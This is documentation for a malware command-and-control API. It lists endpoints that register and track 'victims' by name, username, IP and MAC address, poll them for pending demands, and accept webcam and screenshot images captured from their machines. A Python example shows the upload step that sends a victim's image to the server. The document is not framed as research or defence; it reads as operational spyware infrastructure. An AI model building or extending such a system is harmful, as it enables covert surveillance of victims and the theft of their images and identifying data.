# Malware Control API Documentation

## Base URL
/api/{Endpoint}

## Endpoints

### Malware Router

#### Register Victim

Registers a new victim in the system.

- **URL:** `/mw/registerVictim`
- **Method:** POST
- **Data Params:**
```json
  {
    "name": "string", 
    "username": "string",
    "localIP": "string",
    "publicIP": "string",
    "macAddress": "string",
    "description": "string",
    "img": "string"
  }
```
**Fields `name` and `macAddress` are *required*, rest are optional.**

**Success Response:**

- **Code:** 201
- **Content:** `{ "id": "string", "message": "Victim registered successfully. Id has been returned.", "statusCode": 201 }`



**Error Response:**

- **Code:** 400
- **Content:** `{ "message": "name and macAddress are required." }` or `{ "message": "Invalid data types!" }`

#### Update Victim

Updates an existing victim's information.

- **URL:** `/mw/updateVictim/:id`
- **Method:** POST
- **URL Params:**

- `id`: ID of the victim to update



- **Data Params (all optional):**
```json
{
  "name": "string",
  "username": "string",
  "localIP": "string",
  "publicIP": "string",
  "macAddress": "string",
  "description": "string",
  "img": "string"
}
```

- **Success Response:**
    - **Code**: 200
    - **Content**: `{ "id": "string", "message": "Victim updated successfully.", "statusCode": 200 }`
- **Error Response:**
    - **Code**: 404
    - **Content**: `{ "message": "Victim not found" }` or `{ "message": "Invalid data types!" }`

#### Get Unfulfilled Requests

Retrieves all unfulfilled requests for a specific victim and updates their last seen timestamp.

- **URL:** `/mw/requests/:victimId`
- **Method:** GET
- **URL Params:** 
  - `victimId`: ID of the victim
- **Success Response:**
  - **Code:** 200
  - **Content:** Array of request objects
- **Error Response:**
  - **Code:** 404
  - **Content:** `{ "message": "Victim not found" }`

#### Get All Requests

Retrieves all requests (fulfilled and unfulfilled) for a specific victim and updates their last seen timestamp.

- **URL:** `/mw/allRequests/:victimId`
- **Method:** GET
- **URL Params:**
  - `victimId`: ID of the victim
- **Success Response:**
  - **Code:** 200
  - **Content:** Array of request objects
- **Error Response:**
  - **Code:** 404
  - **Content:** `{ "message": "Victim not found" }`

### Fulfillment Router

#### Fulfill Request

Handles the fulfillment of a specific request.

- **URL**: `/fulfill/:requestId`
- **METHOD**: `POST`
- **URL Params**: `requestId`: ID of the request to fulfill 
- **Data Params**: `img`: File upload (for 'camera' or 'screenshot' demands)
- **Success Response**: 
    - **Code**: 200
    - **Content**: Updated request object
- **Error Response**:
    - **Code**: 404
    - **Content**: `{ "message": "Request not found" }` or `{ "message": "Request has already been fulfilled" }` or `{ "message": "No image file uploaded" }` or `{ "message": "Invalid demand type" }`

**Python example**:
```python
import requests
request_id = "12345" #replace with actual request ID
url = "<server url>/api/fulfill/" + request_id

file_path = "path/to/your/image.jpg"

with open(file_path, "rb") as file:
    # Create a dictionary to hold the file data
    files = {"img": file} 
    try:
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print("Upload successful!")
            print("Response:", response.json())
        else:
            print(f"Failed to upload. Status code: {response.status_code}")
            print("Response:", response.json())
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

```
